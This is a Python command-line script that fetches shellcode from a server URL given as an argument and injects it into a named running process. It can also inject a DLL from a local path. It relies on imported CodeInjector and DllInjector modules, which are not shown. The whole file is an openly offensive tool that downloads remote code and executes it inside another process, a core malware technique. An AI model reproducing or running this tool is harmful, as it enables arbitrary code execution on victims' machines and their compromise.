import argparse
from urllib import request
from code_injector import CodeInjector
from dll_injector import DllInjector

parser = argparse.ArgumentParser()
parser.add_argument('process_name', help='ex: calc.exe')
parser.add_argument('-server', help='ex: https://example.com')
parser.add_argument('-path', help='ex: C://temp/file.dll')

args = parser.parse_args()

def implement_code_injector():
    try:
        response = request.urlopen(args.server)
        shellcode = response.read()

        if shellcode:
            print(f'[*] retrieved the shellcode from {args.server}')
            print(f"[*] Shellcode: {shellcode}")

        code_injector = CodeInjector(process_name=args.process_name, shellcode=shellcode)
        code_injector.execute()
    except Exception as error:
        print(error)

def implement_dll_injector():
    try:
        dll_injector = DllInjector(process_name=args.process_name, path=args.path)
        dll_injector.execute()
    except Exception as error:
        print(error)

if __name__ == "__main__":
    if args.server:
        implement_code_injector()
    elif args.path:
        implement_dll_injector()
    else:
        print("[*] You need provide value for -path or -server argument")